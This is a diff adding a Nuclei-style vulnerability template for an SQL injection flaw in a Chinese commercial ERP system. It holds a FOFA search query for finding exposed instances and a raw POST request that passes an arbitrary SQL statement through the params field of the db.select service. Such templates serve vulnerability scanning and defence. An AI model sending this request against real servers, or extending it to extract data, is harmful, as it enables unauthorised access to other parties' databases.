@@ -1,0 +1,25 @@
+id: yunshikong-erp-params-sqli
+
+info:
+  name: yunshikong-erp-params-sqli
+  author: unknow
+  severity: high
+  description: 云时空商业ERP params 存在SQL注入漏洞
+  tags: yunshikong,sqli
+  metadata:
+    fofa-query: body="云时空社会化商业ERP系统" || body="yunlogo_home.png"
+
+http:
+- raw:
+  - |
+    POST /slogin/service?service=db.select HTTP/1.1
+    Host: 
+    Content-Type: application/x-www-form-urlencoded
+    User-Agent: Mozilla/5.0 
+
+    params=%7B%22sql%22%3A%22SELECT+%2A+FROM+V%24VERSION%22%7D
+
+  matchers:
+  - type: dsl
+    dsl:
+    - "status_code==200 && contains(body,'Database') && contains(header,'application/json')"
